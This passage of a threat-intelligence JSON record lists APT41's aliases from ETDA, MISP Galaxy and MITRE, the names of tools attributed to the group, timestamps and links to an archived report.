                "Skip-2.0",
                "SneakCross",
                "Sogu",
                "Speculoos",
                "Spyder",
                "StealthReacher",
                "StealthVector",
                "TERA",
                "TIDYELF",
                "TIGERPLUG",
                "TOMMYGUN",
                "TVT",
                "Thoper",
                "Voldemort",
                "WIDETONE",
                "WINNKIT",
                "WINTERLOVE",
                "Winnti",
                "WyrmSpy",
                "X-Door",
                "XDOOR",
                "XMRig",
                "XShellGhost",
                "Xamtrav",
                "ZXShell",
                "ZoxPNG",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "gresim",
                "njRAT",
                "pwdump",
                "xDll"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041776,
    "ts_creation_date": 1585267025,
    "ts_modification_date": 1585267025,
    "files": {
        "pdf": "https://archive.orkl.eu/60cdab19b8f87a9d3b1aa0dde91f9cf945cbfb76.pdf",
        "text": "https://archive.orkl.eu/60cdab19b8f87a9d3b1aa0dde91f9cf945cbfb76.txt",
        "img": "https://archive.orkl.eu/60cdab19b8f87a9d3b1aa0dde91f9cf945cbfb76.jpg"
    }
}